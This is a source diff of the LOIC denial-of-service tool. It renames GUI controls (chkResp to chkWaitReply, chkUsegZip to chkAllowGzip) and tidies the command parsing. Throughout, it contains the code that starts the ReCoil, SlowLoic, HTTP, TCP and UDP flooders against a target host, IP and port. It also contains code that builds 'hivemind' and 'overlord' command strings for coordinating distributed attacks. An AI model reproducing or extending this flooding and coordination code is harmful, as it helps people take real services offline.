@@ -144,7 +144,7 @@ namespace LOIC
 						txtTimeout.Text = "30";
 					}
 
-					bResp = chkResp.Checked;
+					bResp = chkWaitReply.Checked;
 
 					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil)
 					{
@@ -160,12 +160,12 @@ namespace LOIC
 
 				cmdAttack.Text = StpFldText;
 				//let's lock down the controls, that could actually change the creation of new sockets
-				chkUsegZip.Enabled = false;
+				chkAllowGzip.Enabled = false;
 				chkUseGet.Enabled = false;
 				chkMsgRandom.Enabled = false;
 				chkRandom.Enabled = false;
 				cbMethod.Enabled = false;
-				chkResp.Enabled = false;
+				chkWaitReply.Enabled = false;
 				txtSLSpT.Enabled = false;
 
 				if (arr.Count > 0)
@@ -184,15 +184,15 @@ namespace LOIC
 
 					if (protocol == Protocol.ReCoil)
 					{
-						ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+						ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 					}
 					if (protocol == Protocol.slowLOIC)
 					{
-						ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+						ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 					}
 					if (protocol == Protocol.HTTP)
 					{
-						ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+						ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkAllowGzip.Checked);
 					}
 					if (protocol == Protocol.TCP || protocol == Protocol.UDP)
 					{
@@ -211,12 +211,12 @@ namespace LOIC
 			else if(toggle || !on)
 			{
 				cmdAttack.Text = AttackText;
-				chkUsegZip.Enabled = true;
+				chkAllowGzip.Enabled = true;
 				chkUseGet.Enabled = true;
 				chkMsgRandom.Enabled = true;
 				chkRandom.Enabled = true;
 				cbMethod.Enabled = true;
-				chkResp.Enabled = true;
+				chkWaitReply.Enabled = true;
 				txtSLSpT.Enabled = true;
 
 				if (arr != null && arr.Count > 0)
@@ -696,7 +696,8 @@ namespace LOIC
 							break;
 						case "method":
 							int index = cbMethod.FindString(value);
-							if (index != -1) { cbMethod.SelectedIndex = index; }
+							if(index != -1)
+								cbMethod.SelectedIndex = index;
 							break;
 						case "threads":
 							if(int.TryParse(value, out num) && num >= 1 && num <= 99)
@@ -704,13 +705,9 @@ namespace LOIC
 							break;
 						case "wait":
 							if (value.ToLowerInvariant() == "true")
-							{
-								chkResp.Checked = true;
-							}
+								chkWaitReply.Checked = true;
 							else if (value.ToLowerInvariant() == "false")
-							{
-								chkResp.Checked = false;
-							}
+								chkWaitReply.Checked = false;
 							break;
 						case "random":
 							if (value.ToLowerInvariant() == "true")
@@ -741,15 +738,12 @@ namespace LOIC
 								chkUseGet.Checked = false;
 							}
 							break;
+						case "gzip":
 						case "usegzip":
 							if (value.ToLowerInvariant() == "true")
-							{
-								chkUsegZip.Checked = true;
-							}
+								chkAllowGzip.Checked = true;
 							else if (value.ToLowerInvariant() == "false")
-							{
-								chkUsegZip.Checked = false;
-							}
+								chkAllowGzip.Checked = false;
 							break;
 						case "sockspthread":
 							isnum = int.TryParse(value, out num);
@@ -778,12 +772,12 @@ namespace LOIC
 						int index = cbMethod.FindString("TCP");
 						if (index != -1) { cbMethod.SelectedIndex = index; }
 						txtThreads.Text = "10";
-						chkResp.Checked = true;
+						chkWaitReply.Checked = true;
 						chkRandom.Checked = false;
 						chkMsgRandom.Checked = false;
 						tbSpeed.Value = 0;
 						txtSLSpT.Text = "50";
-						chkUsegZip.Checked = false;
+						chkAllowGzip.Checked = false;
 						chkUseGet.Checked = false;
 					}
 				}
@@ -935,15 +929,15 @@ namespace LOIC
 
 							if (protocol == Protocol.ReCoil)
 							{
-								ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+								ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 							}
 							if (protocol == Protocol.slowLOIC)
 							{
-								ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+								ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 							}
 							if (protocol == Protocol.HTTP)
 							{
-								ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+								ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkAllowGzip.Checked);
 							}
 							if (protocol == Protocol.TCP || protocol == Protocol.UDP)
 							{
@@ -975,15 +969,15 @@ namespace LOIC
 
 						if (protocol == Protocol.ReCoil)
 						{
-							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 						}
 						if (protocol == Protocol.slowLOIC)
 						{
-							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 						}
 						if (protocol == Protocol.HTTP)
 						{
-							ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+							ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkAllowGzip.Checked);
 						}
 						if (protocol == Protocol.TCP || protocol == Protocol.UDP)
 						{
@@ -1186,15 +1180,15 @@ namespace LOIC
 						case "wait":
 							if (tval.ToLowerInvariant() == "true")
 							{
-								if (!chkResp.Checked)
+								if (!chkWaitReply.Checked)
 									restart = true;
-								chkResp.Checked = true;
+								chkWaitReply.Checked = true;
 							}
 							else if (tval.ToLowerInvariant() == "false")
 							{
-								if (chkResp.Checked)
+								if (chkWaitReply.Checked)
 									restart = true;
-								chkResp.Checked = false;
+								chkWaitReply.Checked = false;
 							}
 							break;
 						case "random":
@@ -1275,11 +1269,11 @@ namespace LOIC
 						case "usegzip":
 							if (tval.ToLowerInvariant() == "true")
 							{
-								chkUsegZip.Checked = true;
+								chkAllowGzip.Checked = true;
 							}
 							else if (tval.ToLowerInvariant() == "false")
 							{
-								chkUsegZip.Checked = false;
+								chkAllowGzip.Checked = false;
 							}
 							break;
 						case "sockspthread":
@@ -1322,7 +1316,7 @@ namespace LOIC
 							txtThreads.Text = "10";
 							break;
 						case "wait":
-							chkResp.Checked = true;
+							chkWaitReply.Checked = true;
 							break;
 						case "random":
 							chkRandom.Checked = false;
@@ -1338,7 +1332,7 @@ namespace LOIC
 							chkUseGet.Checked = false;
 							break;
 						case "usegzip":
-							chkUsegZip.Checked = false;
+							chkAllowGzip.Checked = false;
 							break;
 					}
 				}
@@ -1563,18 +1557,18 @@ namespace LOIC
 					string hivemind = "!lazor targetip=" + txtTargetIP.Text + " targethost=" + txtTargetURL.Text
 						+ "default timeout=" + txtTimeout.Text + " subsite=" + Uri.EscapeDataString(txtSubsite.Text)
 						+ " message=" + Uri.EscapeDataString(txtData.Text) + " port=" + txtPort.Text + " method=" + cbMethod.SelectedItem.ToString()
-						+ " threads=" + txtThreads.Text + " wait=" + ((chkResp.Checked) ? "true" : "false")
+						+ " threads=" + txtThreads.Text + " wait=" + ((chkWaitReply.Checked) ? "true" : "false")
 						+ " random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
 						+ " speed=" + tbSpeed.Value.ToString() + " sockspthread=" + txtSLSpT.Text
-						+ " useget=" + ((chkUseGet.Checked) ? "true" : "false") + " usegzip=" + ((chkUsegZip.Checked) ? "true" : "false") + " start";
+						+ " useget=" + ((chkUseGet.Checked) ? "true" : "false") + " usegzip=" + ((chkAllowGzip.Checked) ? "true" : "false") + " start";
 
 					string overlord = "http://hive.mind/go?@targetip=" + txtTargetIP.Text + "@&@targethost=" + txtTargetURL.Text
 						+ "@&@timeout=" + txtTimeout.Text + "@&@subsite=" + txtSubsite.Text
 						+ "@&@message=" + txtData.Text + "@&@port=" + txtPort.Text + "@&@method=" + cbMethod.SelectedItem.ToString()
-						+ "@&@threads=" + txtThreads.Text + "@&@wait=" + ((chkResp.Checked) ? "true" : "false")
+						+ "@&@threads=" + txtThreads.Text + "@&@wait=" + ((chkWaitReply.Checked) ? "true" : "false")
 						+ "@&@random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
 						+ "@&@speed=" + tbSpeed.Value.ToString() + "@&@sockspthread=" + txtSLSpT.Text
-						+ "@&@useget=" + ((chkUseGet.Checked) ? "true" : "false") + "@&@usegzip=" + ((chkUsegZip.Checked) ? "true" : "false") + "@";
+						+ "@&@useget=" + ((chkUseGet.Checked) ? "true" : "false") + "@&@usegzip=" + ((chkAllowGzip.Checked) ? "true" : "false") + "@";
 
 					new frmEZGrab(hivemind, overlord).Show();
 					e.Handled = true;
@@ -1593,8 +1587,8 @@ namespace LOIC
 			txtSubsite.Enabled = (cbMethod.SelectedIndex >= 2) ? true : false;
 
 			txtSLSpT.Enabled = (cbMethod.SelectedIndex >= 3) ? true : false;
-			chkUsegZip.Enabled = (cbMethod.SelectedIndex >= 2) ? true : false;
-			chkResp.Enabled = (cbMethod.SelectedIndex == 4) ? false : true;
+			chkAllowGzip.Enabled = (cbMethod.SelectedIndex >= 2) ? true : false;
+			chkWaitReply.Enabled = (cbMethod.SelectedIndex == 4) ? false : true;
 			chkUseGet.Enabled = (cbMethod.SelectedIndex == 4) ? true : false;
 		}
 
